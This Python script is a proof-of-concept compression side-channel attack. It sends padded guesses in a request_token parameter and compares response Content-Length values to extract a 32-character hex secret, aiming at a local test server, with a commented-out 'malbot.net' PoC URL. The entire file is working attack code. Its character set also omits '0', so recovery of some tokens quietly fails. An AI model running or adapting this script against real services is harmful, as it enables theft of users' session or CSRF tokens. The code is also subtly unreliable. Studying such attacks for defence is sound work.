import requests
import time

URL = "http://127.0.0.1:5000/secret?request_token="# #"https://malbot.net/poc/?param1=value1"## #"http://localhost:8081/"#
#URL = "https://malbot.net/poc/?request_token=%27"
PADDING = "{}{}{}{}{}"#"..........."
HEX = ['1','2','3','4','5','6','7','8','9','a','b','c','d','e','f']
SCORES = [0] * len(HEX)

#token = 'bb63e4ba67e24dab81ed425c5a95b7a2'
#token = '9cf23dfa3c7c7396df0e477a3cd9e8c1'
TOKEN = ""
count = 0
check = True

time_start = time.time()

while (check):

    responB = int(requests.get(URL+PADDING+PADDING).headers.get('Content-Length'))
    print(responB)
    addLet = True
    
    for h in HEX:
        count+=1
        build1 = TOKEN+h+PADDING+PADDING
        build2 = TOKEN+PADDING+h+PADDING

        req1 = int(requests.get(URL+build1).headers.get('Content-Length'))
        print("TRY "+build1+" Length Response = "+str(req1))

        req2 = int(requests.get(URL+build2).headers.get('Content-Length'))
        print("TRY "+build2+" Length Response = "+str(req2))

        SCORES[HEX.index(h)] = abs(req1 - req2)
        
        max_value = max(SCORES)
        max_values = [i for i, x in enumerate(SCORES) if x == max_value]

        if (int(req1) <= responB) and (int(req2) > int(req1)):
            temp = h
            break

        #if tried all characters
        if(h == 'f'):
            if(len(max_values) == 1):
                temp = HEX[max_values[0]]
                break
            elif(len(TOKEN) < 32):
                #check = False
                print("\nincreasing padding size\n")
                PADDING = PADDING + "{}"#"."
                addLet = False
            else:
                break
        
    SCORES = [0] * len(HEX)
    if(check and addLet):
        TOKEN = TOKEN + temp
        #print("\nreset padding size\n")
        #PADDING = "{}{}{}{}{}"#"..........."
        #print(TOKEN)

    if(len(TOKEN)==32):
        break
    #elif(len(max_values) == len(HEX)):
    #    print("Error!!! all response scores the same")
    #    break


print("Iterations = "+str(count))
print("Time elapsed = "+str(time.time()-time_start)+" seconds.")
print("Token: " +TOKEN)